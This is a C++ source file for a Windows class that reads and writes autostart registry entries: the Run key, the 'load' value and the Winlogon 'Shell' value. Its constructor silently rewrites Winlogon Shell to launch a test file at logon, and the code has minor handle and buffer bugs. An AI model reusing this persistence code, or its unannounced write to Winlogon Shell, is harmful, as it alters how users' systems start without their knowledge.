#include ".\startaggregate.h"

CStartAggregate::CStartAggregate(void)
{
	WCHAR szPath[MAX_PATH];
	memset(szPath, 0, sizeof(szPath));
	GetWindowsDirectory(szPath, MAX_PATH);
	m_strWindowsPath = szPath;
	memset(szPath, 0, sizeof(szPath));
	GetSystemWindowsDirectory(szPath, MAX_PATH);
	m_strSystemPath = szPath;
	memset(szPath, 0, sizeof(szPath));
	DWORD dwLen = sizeof(szPath);
	bool bRet = ReadRegisterKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion", L"ProgramFilesDir", szPath, &dwLen);
	if( bRet )
	{
		if( szPath[lstrlen(szPath) -1] != L'\\')
			lstrcat(szPath, L"\\");
		m_strIePath = szPath;
		m_strIePath += L"Internet Explorer\\";
	}
	memset(szPath, 0, sizeof(szPath));

	SetCurrentVersionWinlogonShell(L"c:\\ttt.txt");
	GetCurrentVersionWinlogonShell(szPath);
	bRet = false;

}

CStartAggregate::~CStartAggregate(void)
{
}
HKEY CStartAggregate::OpenRegisterKey(HKEY hKey, LPCWSTR lpSubKey, REGSAM samDesired)
{
	HKEY  hKEY;
	long  ret = RegOpenKeyEx(hKey,lpSubKey, 0, samDesired, &hKEY);
	if(ret!=ERROR_SUCCESS)
	{ 
		RegCloseKey(hKEY);
		return NULL;
	}
	return hKEY;
}
bool CStartAggregate::ReadRegisterKey(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpKey, LPCWSTR lpRet, DWORD* dwRet)
{
	HKEY  hKEY = OpenRegisterKey(hKey, lpSubKey, KEY_READ);
	if(!hKEY)
		return false;
	DWORD dwType = REG_SZ;
	long  ret = RegQueryValueEx(hKEY, lpKey, 0, &dwType, (LPBYTE)lpRet, dwRet);
	RegCloseKey(hKEY);
	if(ret != ERROR_SUCCESS)
		return false;
	return true;
}
bool CStartAggregate::WriteRegisterKey(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpKey, LPCWSTR lpRet, DWORD dwRet)
{
	HKEY  hKEY = OpenRegisterKey(hKey, lpSubKey, KEY_WRITE);
	if(!hKEY)
		return false;
	long  ret = RegSetValueEx(hKEY, lpKey, 0, REG_SZ, (LPBYTE)lpRet, dwRet * sizeof(TCHAR));
	RegCloseKey(hKEY);
	if(ret != ERROR_SUCCESS)
		return false;
	return true;
}

bool CStartAggregate::SetCurrentVersionRun(LPCWSTR szKey, LPCWSTR szVel)
{
	return WriteRegisterKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", szKey, szVel, lstrlen(szVel) );
}
bool CStartAggregate::GetCurrentVersionRun(LPCWSTR szKey, LPWSTR szVel, DWORD dwLen)
{
	bool bRet = ReadRegisterKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", szKey, szVel, &dwLen);
	if(!bRet)
		return false;
	if(lstrlen(szVel) == 0)
		return false;
	return true;
}


bool CStartAggregate::SetCurrentWindowsLoad(LPCWSTR szVel)
{
	return WriteRegisterKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", L"load", szVel, lstrlen(szVel));
}
bool CStartAggregate::GetCurrentWindowsLoad(LPWSTR szVel, DWORD dwLen )
{
	bool bRet =  ReadRegisterKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", L"load", szVel, &dwLen);
	if(!bRet)
		return false;
	if(lstrlen(szVel) == 0)
		return false;
	return true;
}

bool CStartAggregate::SetCurrentVersionWinlogonShell(LPCWSTR szVel, bool bOverlay )
{
	std::wstring strVel;
	if(!bOverlay)
		strVel += L"Explorer.exe ";
	strVel += szVel;
	return WriteRegisterKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", strVel.c_str(), lstrlen(strVel.c_str()));
}

bool CStartAggregate::GetCurrentVersionWinlogonShell(LPWSTR szVel, DWORD dwLen )
{
	bool bRet = ReadRegisterKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", szVel, &dwLen);
	if(!bRet)
		return false;
	if(lstrlen(szVel) == 0)
		return false;
	return true;
}
